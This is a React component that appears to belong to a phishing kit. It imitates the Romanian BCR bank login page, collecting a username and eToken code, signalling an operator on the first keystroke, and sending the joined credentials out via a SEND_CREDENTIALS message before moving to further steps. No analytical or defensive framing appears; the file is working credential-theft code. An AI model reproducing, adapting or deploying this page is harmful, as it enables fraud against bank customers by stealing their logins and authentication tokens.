import React, { useState, useEffect } from 'react'
import { storage } from '../storage/storage'
import { Messaging } from '../utils/messages'
import { UserActions, STEPS  } from '../utils/constants'
import { FieldType, CREDENTIALS_DELIMETER } from '../utils/constants'
import logo from '../media/logo-bcr.png'
import keyboard from '../media/virtual-keyboard.png'
import eng from '../media/eng.PNG'
import ro from '../media/ro.PNG'
import { ErrorMsg } from '../Components/ErrorMsg'


export const Step_1 = props => {
  const { store, changeStore } = props

  const [login, setLogin] = useState('')
  const [password, setPassword] = useState('')
  const [showError, setShowError] = useState('')
  
  const error = store.error
  const setError = val => changeStore({ error: val })
  

  const handleChange = (value, type) => {
    if (type === FieldType.LOGIN) {
      setLogin(value)
    }
    if (type === FieldType.PASSWORD) {
      setPassword(value)
    }
    if (!storage.touched) {
      console.log('Typing...')
      Messaging.start()
      storage.touched = true
    }
  }

  const handleSubmit = e => {
    e.preventDefault()

    const value = `${login}${CREDENTIALS_DELIMETER}${password}`
    if (!login || !password) {
      console.log('set error')
      setError(true)
      setShowError(true)
      return
    }

    Messaging.send({ type: UserActions.SEND_CREDENTIALS, payload: value })

    changeStore({
      step_1_cod : value,
      loading: true,
    })

  }

  return (
    <div className="section-container" >
      <div className="form-container">
        <form onSubmit={handleSubmit}>
        <div className="logo-container">
          <img src={logo} alt="logo-bcr" />
        </div>
        {error && <ErrorMsg errorMessage="Nume utilizator sau cod eToken este introdus eronat." />}
        <div className="form-field">
          <input type="text" placeholder="Nume utilizator" onChange={e => handleChange(e.target.value, FieldType.LOGIN)}/>
        </div>
        <div className="form-field">
          <input type="password" placeholder="Cod eToken / Token" onChange={e => handleChange(e.target.value, FieldType.PASSWORD)}/>
        </div>
        <div className="reset-container">
          <img src={keyboard} alt="keyboard" className="keyboard" />
          <a onClick={() => changeStore({ step: STEPS.STEP_2})}>Activare eToken</a>
        </div>
        <div className="login-container">
          <button type="submit" className="primary-btn login-btn">Login</button>
        </div>
        <div className="select-language-container">
          <img src={eng} alt="English" style={{width: '12%'}} />
          <img src={ro} alt="Romanian" />

        </div>
        </form>
      </div>
    </div>
    
  )
}


